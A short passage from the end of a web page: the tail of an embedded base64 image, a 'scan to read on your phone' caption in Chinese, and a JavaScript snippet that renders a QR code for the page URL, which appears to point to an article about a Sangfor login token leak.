jpC0F9CAeud1m3D/v441eIU+6fF2Tq3Yfo5uExN9fRvnvsGUhvM/orDsmf5Xq9eRHSB0bUf1T/xwPxJhf+nRM4DMTpdTy7HeRpsK7nuw5jHsKt6/muQ/JwRzNi7yGH1HRu3QohdRA0Zx9RvaM+pB6C+9xhIHvzuv75E9gGApkWPMbVFvv05eYhfeX6EF2uL6pDcuozNDvzntGsF62B3Ftd1BdhnjMPc9/6wm0gRa71/hO4BvL+GQw7+BcAAP//JFtPOwAAAAZJREFUAwAzpUCebIFS7AAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-login-search\_login-token-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 